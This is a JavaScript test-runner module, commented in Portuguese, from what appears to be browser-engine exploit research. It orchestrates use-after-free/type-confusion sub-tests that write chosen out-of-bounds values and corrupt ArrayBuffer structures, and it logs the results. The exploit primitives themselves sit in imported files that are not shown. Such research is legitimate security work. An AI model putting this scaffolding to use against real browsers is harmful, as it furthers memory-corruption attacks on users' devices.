// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeUAFTypeConfusionTestWithValue } from './testJsonTypeConfusionUAFSpeculative.mjs'; // Mantemos para outros testes
import { testCorruptArrayBufferStructure } from './testCorruptArrayBufferStructure.mjs'; // Nova importação
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';

// A função runUAFTC_VaryingOOBValue_WithExtendedRead (ou WithSpecRead) pode ser mantida se você ainda quiser esses testes.
// Vamos adicionar uma nova função para chamar o testCorruptArrayBufferStructure.

async function runUAFTC_VaryingOOBValue_WithSpecRead() {
    const FNAME_RUNNER = "runUAFTC_VaryingOOBValue_WithSpecRead";
    logS3(`==== INICIANDO Testes UAF/TC Variando Valor OOB (com Checagem de Leitura Especulativa) ====`, 'test', FNAME_RUNNER);

    const valuesToWrite = [
        { desc: "Val_FFFFFFFF", val: 0xFFFFFFFF },
        { desc: "Val_00000000", val: 0x00000000 },
        { desc: "Val_00010000", val: 0x00010000 },
        { desc: "Val_GiganticSizeSim", val: 0x04000000 }
    ];
    const baseTestDescription = "UAFTC_SpecRead_Offset0x70";

    for (const oobValue of valuesToWrite) {
        const testDescription = `${baseTestDescription}_${oobValue.desc}`;
        logS3(`\n--- Executando Teste UAF/TC (SpecRead): ${testDescription} (Valor OOB: ${toHex(oobValue.val)}) ---`, 'subtest', FNAME_RUNNER);
        let result = await executeUAFTypeConfusionTestWithValue(testDescription, oobValue.val);
        // Log de resultado... (pode copiar da sua versão anterior)
        if (result.potentiallyFroze) {
            logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
        } else if (result.errorOccurred) {
            logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
        } else {
            logS3(`   RESULTADO ${testDescription}: Completou. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
    }
    logS3(`==== Testes UAF/TC Variando Valor OOB (Leitura Especulativa) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_Main';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3 Avançado ====`,'test', FNAME);
    document.title = "Iniciando Script 3 Avançado";

    // --- Teste 1: Corrupção Direta de Estrutura ArrayBuffer ---
    // Certifique-se de que KNOWN_STRUCTURE_IDS.ArrayBuffer em config.mjs está correto
    // e os offsets em CORRUPTION_AB_CONFIG dentro de testCorruptArrayBufferStructure.mjs estão revisados.
    // E PRINCIPALMENTE: search_base_address_str e search_range_bytes!
    logS3(`\n--- Sub-Teste: Corrupção Direta de Estrutura ArrayBuffer ---`, 'subtest', FNAME);
    await testCorruptArrayBufferStructure();
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`--- Sub-Teste: Corrupção Direta de Estrutura ArrayBuffer CONCLUÍDO ---`, 'subtest', FNAME);


    // --- Teste 2: Variação de Valor OOB com Leitura Especulativa (opcional, pode manter ou remover) ---
    // logS3(`\n--- Sub-Teste: Variação de Valor OOB com Leitura Especulativa ---`, 'subtest', FNAME);
    // await runUAFTC_VaryingOOBValue_WithSpecRead();
    // await PAUSE_S3(MEDIUM_PAUSE_S3);
    // logS3(`--- Sub-Teste: Variação de Valor OOB com Leitura Especulativa CONCLUÍDO ---`, 'subtest', FNAME);


    logS3(`\n==== Script 3 Avançado CONCLUÍDO ====`,'test', FNAME);
    document.title = "Script 3 Avançado Concluído";
    if (runBtn) runBtn.disabled = false;
}
